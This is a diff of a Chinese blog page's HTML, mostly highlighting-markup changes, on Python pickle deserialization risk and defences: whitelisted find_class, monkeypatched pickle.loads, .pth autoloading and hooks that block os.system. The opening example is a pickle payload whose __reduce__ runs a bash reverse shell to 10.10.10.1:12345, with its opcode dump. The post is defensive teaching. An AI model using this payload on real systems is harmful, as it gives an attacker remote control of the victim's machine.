@@ -154,19 +154,19 @@
 </blockquote>
 <h1 id="案例">案例</h1>
 <p>有次同事找我看个Python的安全问题。测试代码是这样的：</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
-<span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">os</span>
-
-<span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Test</span>(<span style="color:#658b00">object</span>):
-    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">__reduce__</span>(self):
-        cmd = <span style="color:#cd5555">&#34;&#34;&#34;bash -i &amp;&gt; /dev/tcp/10.10.10.1/12345 0&gt;&amp;1 2&gt;&amp;1&#34;&#34;&#34;</span>
-        <span style="color:#8b008b;font-weight:bold">return</span> (os.system,(cmd,))
-
-<span style="color:#8b008b;font-weight:bold">if</span> __name__ == <span style="color:#cd5555">&#34;__main__&#34;</span>:
-    test = Test()
-    bs = pickle.dumps(test)
-    pickle.loads(bs)
-</code></pre></div><p>这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Test</span>(<span style="color:#658b00">object</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        cmd = <span style="color:#cd5555">&#34;&#34;&#34;bash -i &amp;&gt; /dev/tcp/10.10.10.1/12345 0&gt;&amp;1 2&gt;&amp;1&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">return</span> (os.system,(cmd,))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">if</span> __name__ == <span style="color:#cd5555">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    test = Test()
+</span></span><span style="display:flex;"><span>    bs = pickle.dumps(test)
+</span></span><span style="display:flex;"><span>    pickle.loads(bs)
+</span></span></code></pre></div><p>这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。</p>
 <p>目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。</p>
 <h1 id="漏洞分析">漏洞分析</h1>
 <p>pickle在<a href="https://docs.python.org/3/library/pickle.html">python的官方介绍</a>中有一段这样的介绍:</p>
@@ -177,15 +177,15 @@
 </blockquote>
 <p>简单翻译一下：只对你信任数据进行unpickle，因为可以构建恶意的pickle数据，在unpickle时会执行任何代码，要么考虑采用hmac对数据签名检查。</p>
 <p>pickle是一种基于栈的编程语言，目前发展到python3.8已有5个协议版本。我们先使用python2来看一下案例中的代码序列化会生成什么（python3中dumps类型是bytes而在python2是str）:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">cposix
-system
-p0
-(S<span style="color:#cd5555">&#39;bash -i &amp;&gt; /dev/tcp/10.10.10.1/12345 0&gt;&amp;1 2&gt;&amp;1&#39;</span>
-p1
-tp2
-Rp3
-.
-</code></pre></div><p>这里涉及到pickle语言指令，能执行这种指令是PVM(Pickle Virtul Machine)，Python运行环境也是一个PVM，它由下面三部分组成：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cposix
+</span></span><span style="display:flex;"><span>system
+</span></span><span style="display:flex;"><span>p0
+</span></span><span style="display:flex;"><span>(S<span style="color:#cd5555">&#39;bash -i &amp;&gt; /dev/tcp/10.10.10.1/12345 0&gt;&amp;1 2&gt;&amp;1&#39;</span>
+</span></span><span style="display:flex;"><span>p1
+</span></span><span style="display:flex;"><span>tp2
+</span></span><span style="display:flex;"><span>Rp3
+</span></span><span style="display:flex;"><span>.
+</span></span></code></pre></div><p>这里涉及到pickle语言指令，能执行这种指令是PVM(Pickle Virtul Machine)，Python运行环境也是一个PVM，它由下面三部分组成：</p>
 <ul>
 <li>指令处理器(Instruction processor)：解释与执行指令，遇到<code>.</code>结束</li>
 <li>栈区(stack)：数据处理过程中的暂存区，通过进出栈完成数据操作</li>
@@ -215,54 +215,54 @@ Rp3
 <p>就是由于个这个元组，跟pickle中的指令<code>R</code>可被利用之机：&ldquo;该元组作为可调用参数的对象并执行该对象&rdquo;，如果这个元组有恶意代码，则可以调用而产生风险。虽然<code>__reduce__</code>返回只能是一个可调用对象，但可以结合os.system，subprocess.run，exec来执行任一命令或代码，几乎能做任何事了。</p>
 <h1 id="解决办法">解决办法</h1>
 <p>正如python官方对pickle的介绍说明，只对信任的数据unpickle，对数据数字签名检查。但通常数字签名只限于自产自销的场景。打开pickle的源码来看，事实上还有另一个方法。python定义了Unpickler的接口，关键在于可以覆写find_class，下面是标准库的默认实现：</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_class</span>(self, module, name):
-    <span style="color:#228b22"># Subclasses may override this.</span>
-    sys.audit(<span style="color:#cd5555">&#39;pickle.find_class&#39;</span>, module, name)
-    <span style="color:#8b008b;font-weight:bold">if</span> self.proto &lt; <span style="color:#b452cd">3</span> <span style="color:#8b008b">and</span> self.fix_imports:
-        <span style="color:#8b008b;font-weight:bold">if</span> (module, name) <span style="color:#8b008b">in</span> _compat_pickle.NAME_MAPPING:
-            module, name = _compat_pickle.NAME_MAPPING[(module, name)]
-        <span style="color:#8b008b;font-weight:bold">elif</span> module <span style="color:#8b008b">in</span> _compat_pickle.IMPORT_MAPPING:
-            module = _compat_pickle.IMPORT_MAPPING[module]
-    <span style="color:#658b00">__import__</span>(module, level=<span style="color:#b452cd">0</span>)
-    <span style="color:#8b008b;font-weight:bold">if</span> self.proto &gt;= <span style="color:#b452cd">4</span>:
-        <span style="color:#8b008b;font-weight:bold">return</span> _getattribute(sys.modules[module], name)[<span style="color:#b452cd">0</span>]
-    <span style="color:#8b008b;font-weight:bold">else</span>:
-        <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">getattr</span>(sys.modules[module], name)
-</code></pre></div><p>默认实现的find_class函数会自动导入模块，并且还兼容python2时fix_imports。若覆写，采用对导入模块做白名单检查控制，不允许导入像os.system等可以执行命令或代码能力，则问题已基本可以解决。那这个函数什么时机被调用呢？从代码搜索来看有4处调用此函数，他们是在解释指令的地方。如案例中的<code>c</code>指令导入模块时，就会调用它。</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
-
-<span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">WhiteListUnpickler</span>(pickle.Unpickler):
-    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_class</span>(self, module, name):
-        self.check_safe_module(module, name)
-        <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">super</span>().find_class(module, name)
-    
-    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">check_safe_module</span>(module, name):
-        <span style="color:#228b22"># 检查是否在白名单</span>
-        <span style="color:#8b008b;font-weight:bold">if</span> module != <span style="color:#cd5555">&#39;__main__&#39;</span>: 
-            <span style="color:#8b008b;font-weight:bold">raise</span> pickle.UnpicklingError(<span style="color:#cd5555">&#34;&#39;</span><span style="color:#cd5555">%s</span><span style="color:#cd5555">.</span><span style="color:#cd5555">%s</span><span style="color:#cd5555">&#39; is forbidden&#34;</span> % (module, name))
-
-bs = <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;....&#39;</span> <span style="color:#228b22"># 需要unpickler的内容</span>
-file = io.BytesIO(bs)
-WhiteListUnpickler(file).load()
-</code></pre></div><p>上面的代码示例只允许<code>__main__</code>模块调用，采用白名单谨慎列出安全的模块则可以规避安全问题。但这需要调用者生成WhiteListUnpickler类，对业务代码有侵入性。那有没有一种对上层调用不感知的修改？有:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
-
-<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_load</span>(file, *, fix_imports=<span style="color:#8b008b;font-weight:bold">True</span>, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
-          buffers=<span style="color:#8b008b;font-weight:bold">None</span>):
-    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers,
-                     encoding=encoding, errors=errors).load()
-
-<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_loads</span>(s, *, fix_imports=<span style="color:#8b008b;font-weight:bold">True</span>, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
-           buffers=<span style="color:#8b008b;font-weight:bold">None</span>):
-    file = io.BytesIO(s)
-    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers,
-                      encoding=encoding, errors=errors).load()
-
-pickle.load = safe_load
-pickle.loads = safe_loads
-
-<span style="color:#228b22"># 后面的代码调用pickle.loads时，真实调用的safe_loads</span>
-</code></pre></div><p>python是动态语言，任何模块、对象、函数都是可能动态替换的，不光如此，还可以动态给类/实例增加方法或成员变量。</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_class</span>(self, module, name):
+</span></span><span style="display:flex;"><span>    <span style="color:#228b22"># Subclasses may override this.</span>
+</span></span><span style="display:flex;"><span>    sys.audit(<span style="color:#cd5555">&#39;pickle.find_class&#39;</span>, module, name)
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">if</span> self.proto &lt; <span style="color:#b452cd">3</span> <span style="color:#8b008b">and</span> self.fix_imports:
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">if</span> (module, name) <span style="color:#8b008b">in</span> _compat_pickle.NAME_MAPPING:
+</span></span><span style="display:flex;"><span>            module, name = _compat_pickle.NAME_MAPPING[(module, name)]
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">elif</span> module <span style="color:#8b008b">in</span> _compat_pickle.IMPORT_MAPPING:
+</span></span><span style="display:flex;"><span>            module = _compat_pickle.IMPORT_MAPPING[module]
+</span></span><span style="display:flex;"><span>    <span style="color:#658b00">__import__</span>(module, level=<span style="color:#b452cd">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">if</span> self.proto &gt;= <span style="color:#b452cd">4</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">return</span> _getattribute(sys.modules[module], name)[<span style="color:#b452cd">0</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">getattr</span>(sys.modules[module], name)
+</span></span></code></pre></div><p>默认实现的find_class函数会自动导入模块，并且还兼容python2时fix_imports。若覆写，采用对导入模块做白名单检查控制，不允许导入像os.system等可以执行命令或代码能力，则问题已基本可以解决。那这个函数什么时机被调用呢？从代码搜索来看有4处调用此函数，他们是在解释指令的地方。如案例中的<code>c</code>指令导入模块时，就会调用它。</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">WhiteListUnpickler</span>(pickle.Unpickler):
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_class</span>(self, module, name):
+</span></span><span style="display:flex;"><span>        self.check_safe_module(module, name)
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">super</span>().find_class(module, name)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">check_safe_module</span>(module, name):
+</span></span><span style="display:flex;"><span>        <span style="color:#228b22"># 检查是否在白名单</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">if</span> module != <span style="color:#cd5555">&#39;__main__&#39;</span>: 
+</span></span><span style="display:flex;"><span>            <span style="color:#8b008b;font-weight:bold">raise</span> pickle.UnpicklingError(<span style="color:#cd5555">&#34;&#39;</span><span style="color:#cd5555">%s</span><span style="color:#cd5555">.</span><span style="color:#cd5555">%s</span><span style="color:#cd5555">&#39; is forbidden&#34;</span> % (module, name))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bs = <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;....&#39;</span> <span style="color:#228b22"># 需要unpickler的内容</span>
+</span></span><span style="display:flex;"><span>file = io.BytesIO(bs)
+</span></span><span style="display:flex;"><span>WhiteListUnpickler(file).load()
+</span></span></code></pre></div><p>上面的代码示例只允许<code>__main__</code>模块调用，采用白名单谨慎列出安全的模块则可以规避安全问题。但这需要调用者生成WhiteListUnpickler类，对业务代码有侵入性。那有没有一种对上层调用不感知的修改？有:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_load</span>(file, *, fix_imports=<span style="color:#8b008b;font-weight:bold">True</span>, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
+</span></span><span style="display:flex;"><span>          buffers=<span style="color:#8b008b;font-weight:bold">None</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers,
+</span></span><span style="display:flex;"><span>                     encoding=encoding, errors=errors).load()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_loads</span>(s, *, fix_imports=<span style="color:#8b008b;font-weight:bold">True</span>, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
+</span></span><span style="display:flex;"><span>           buffers=<span style="color:#8b008b;font-weight:bold">None</span>):
+</span></span><span style="display:flex;"><span>    file = io.BytesIO(s)
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(file, fix_imports=fix_imports, buffers=buffers,
+</span></span><span style="display:flex;"><span>                      encoding=encoding, errors=errors).load()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pickle.load = safe_load
+</span></span><span style="display:flex;"><span>pickle.loads = safe_loads
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#228b22"># 后面的代码调用pickle.loads时，真实调用的safe_loads</span>
+</span></span></code></pre></div><p>python是动态语言，任何模块、对象、函数都是可能动态替换的，不光如此，还可以动态给类/实例增加方法或成员变量。</p>
 <h1 id="自动加载">自动加载</h1>
 <p>前面通过safe_loads替换了标准库的实现，但我们还需要解决一个问题，如何让替换的代码先于业务代码执行？不好的做法是所有替换逻辑封装一个API，让业务在启动时最开始的地方调用一下。那有没有一种对上层不感知的自动加载？有。</p>
 <p>对于C程序，通过设置LD_PRELOAD环境变量可以先加载一个动态库，替换系统函数或者进程中其它导出符号的函数。Python是否也有一种机制？Python的玩法有些不一样，提供了另一种机制。参见官方文档<a href="https://docs.python.org/zh-cn/3/library/site.html">site —— 指定域的配置钩子</a>。对机制简述如下：</p>
@@ -273,44 +273,44 @@ pickle.loads = safe_loads
 </ul>
 <p>这就相当留下一个钩子，可以完成第三方模块导入时的初始化。利用这个机制，同样可以完成需要替换的函数先于业务代码自动加载。site机制如此的强大，其实也是一个非常大的安全隐患。因为我们通过pip install来安装第三方库，也可能写入pth文件，若它是一个恶意库或被篡改了，鬼知道它会做什么呢。前一段时间刷新闻看到pypi仓库清理了5000多个有问题的库。</p>
 <p>假定我们需要替换多个标准库的函数实现，若一个个通过<code>pickle.loads = safe_loads</code>这类方式来替换看起来有点比较丑陋，有没有一种可以比较好玩的方法？有：</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Hook</span>:
-    <span style="color:#8b008b;font-weight:bold">def</span> __init__(self):
-        self._hook_to_orig = <span style="color:#658b00">dict</span>()
-        self._orig_to_hook = <span style="color:#658b00">dict</span>()
-
-    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">register</span>(self, obj, attr):
-        <span style="color:#cd5555">&#34;&#34;&#34;注册hook函数&#34;&#34;&#34;</span>
-        full_name = <span style="color:#cd5555">&#39;.&#39;</span>.join([obj.__name__, attr])
-        <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">wrapper</span>(new_attr):
-            self._orig_to_hook[full_name] = new_attr
-            old_attr = <span style="color:#658b00">getattr</span>(obj, attr)
-            <span style="color:#658b00">setattr</span>(obj, attr, new_attr)
-            self._hook_to_orig[new_attr.__name__] = old_attr
-            <span style="color:#8b008b;font-weight:bold">return</span> new_attr
-        <span style="color:#8b008b;font-weight:bold">return</span> wrapper
-
-    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">get_orig_func</span>(self):
-        <span style="color:#cd5555">&#34;&#34;&#34;获取原始函数&#34;&#34;&#34;</span>
-        frame = sys._getframe(<span style="color:#b452cd">1</span>)
-        <span style="color:#8b008b;font-weight:bold">if</span> frame <span style="color:#8b008b">and</span> frame.f_code.co_name <span style="color:#8b008b">in</span> self._hook_to_orig:
-            <span style="color:#8b008b;font-weight:bold">return</span> self._hook_to_orig[frame.f_code.co_name]
-        <span style="color:#8b008b;font-weight:bold">else</span>:
-            <span style="color:#8b008b;font-weight:bold">raise</span> <span style="color:#008b45;font-weight:bold">Exception</span>(<span style="color:#cd5555">&#34;`original` must be called from a hooked function&#34;</span>)
-
-hook = Hook()
-
-<span style="color:#228b22"># 示例，对os.system进行hook</span>
-<span style="color:#707a7c">@hook</span>.register(os, <span style="color:#cd5555">&#39;system&#39;</span>)
-<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">hook_system</span>(cmd):
-    <span style="color:#8b008b;font-weight:bold">raise</span> <span style="color:#008b45;font-weight:bold">Exception</span>(<span style="color:#cd5555">&#34;forbid execute the function&#34;</span>)
-
-<span style="color:#228b22"># 示例，对open进行hook</span>
-<span style="color:#707a7c">@hook</span>.register(buildins, <span style="color:#cd5555">&#39;open&#39;</span>)
-<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">hook_open</span>(*arg, **argv):
-    orig = get_orig_func()
-    <span style="color:#228b22"># 对参数检查，如检查文件路径是否合法 </span>
-    <span style="color:#8b008b;font-weight:bold">return</span> orig(*arg, **argv)
-</code></pre></div><p>代码不算很难，Hook类主要提供两个函数（注：代码只做演示，未考虑一些异常场景）：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Hook</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        self._hook_to_orig = <span style="color:#658b00">dict</span>()
+</span></span><span style="display:flex;"><span>        self._orig_to_hook = <span style="color:#658b00">dict</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">register</span>(self, obj, attr):
+</span></span><span style="display:flex;"><span>        <span style="color:#cd5555">&#34;&#34;&#34;注册hook函数&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        full_name = <span style="color:#cd5555">&#39;.&#39;</span>.join([obj.__name__, attr])
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">wrapper</span>(new_attr):
+</span></span><span style="display:flex;"><span>            self._orig_to_hook[full_name] = new_attr
+</span></span><span style="display:flex;"><span>            old_attr = <span style="color:#658b00">getattr</span>(obj, attr)
+</span></span><span style="display:flex;"><span>            <span style="color:#658b00">setattr</span>(obj, attr, new_attr)
+</span></span><span style="display:flex;"><span>            self._hook_to_orig[new_attr.__name__] = old_attr
+</span></span><span style="display:flex;"><span>            <span style="color:#8b008b;font-weight:bold">return</span> new_attr
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">return</span> wrapper
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">get_orig_func</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#cd5555">&#34;&#34;&#34;获取原始函数&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        frame = sys._getframe(<span style="color:#b452cd">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">if</span> frame <span style="color:#8b008b">and</span> frame.f_code.co_name <span style="color:#8b008b">in</span> self._hook_to_orig:
+</span></span><span style="display:flex;"><span>            <span style="color:#8b008b;font-weight:bold">return</span> self._hook_to_orig[frame.f_code.co_name]
+</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#8b008b;font-weight:bold">raise</span> <span style="color:#008b45;font-weight:bold">Exception</span>(<span style="color:#cd5555">&#34;`original` must be called from a hooked function&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hook = Hook()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#228b22"># 示例，对os.system进行hook</span>
+</span></span><span style="display:flex;"><span><span style="color:#707a7c">@hook</span>.register(os, <span style="color:#cd5555">&#39;system&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">hook_system</span>(cmd):
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">raise</span> <span style="color:#008b45;font-weight:bold">Exception</span>(<span style="color:#cd5555">&#34;forbid execute the function&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#228b22"># 示例，对open进行hook</span>
+</span></span><span style="display:flex;"><span><span style="color:#707a7c">@hook</span>.register(buildins, <span style="color:#cd5555">&#39;open&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">hook_open</span>(*arg, **argv):
+</span></span><span style="display:flex;"><span>    orig = get_orig_func()
+</span></span><span style="display:flex;"><span>    <span style="color:#228b22"># 对参数检查，如检查文件路径是否合法 </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">return</span> orig(*arg, **argv)
+</span></span></code></pre></div><p>代码不算很难，Hook类主要提供两个函数（注：代码只做演示，未考虑一些异常场景）：</p>
 <ul>
 <li>register：装饰器函数，用于注册hook的函数，保存与原始函数映射关系</li>
 <li>get_orig_func：用于获取原始函数</li>
@@ -413,7 +413,7 @@ hook = Hook()
       <nav class="site-state motion-element">
     <div class="site-state-item site-state-posts">
       <a href="http://lanlingzi.cn/post/">
-        <span class="site-state-item-count">162</span>
+        <span class="site-state-item-count">163</span>
         <span class="site-state-item-name">日志</span>
       </a>
     </div>
@@ -494,7 +494,7 @@ hook = Hook()
   <span class="author" itemprop="copyrightHolder">蘭陵N梓記</span>
 </div>
 <div class="powered-by">
-  Powered by - <a class="theme-link" href="http://gohugo.io" target="_blank" title="hugo" >Hugo v0.88.1</a>
+  Powered by - <a class="theme-link" href="http://gohugo.io" target="_blank" title="hugo" >Hugo v0.99.1</a>
 </div>
 <div class="theme-info">
   Theme by - <a class="theme-link" href="https://github.com/xtfly/hugo-theme-next" target="_blank"> NexT
